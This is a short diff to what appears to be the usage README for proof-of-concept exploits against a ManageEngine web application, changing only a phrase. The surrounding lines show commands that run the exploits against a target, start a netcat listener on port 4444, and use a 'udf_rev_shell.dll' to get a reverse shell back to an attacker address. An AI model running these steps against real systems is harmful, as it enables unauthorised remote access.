@@ -25,7 +25,7 @@ python2 poc1.py https://manageengine:8443 192.168.45.211 4444
 nc -lnvp 4444
 ```
 
-2. Run the proof of concept (poc2.py) using Python2 and specify the target ManageEngine web application and listener parameters. Ensure that the `udf_rev_shell.dll` file is in the same working directory as `poc2.py`:
+2. Run the proof of concept (poc2.py) using Python2 and specify the target ManageEngine web application and listener parameters. Ensure that the `udf_rev_shell.dll` file is in the same working directory as `poc2.py` script:
 ```bash
 python2 poc2.py https://manageengine:8443 192.168.45.211 4444
 ```
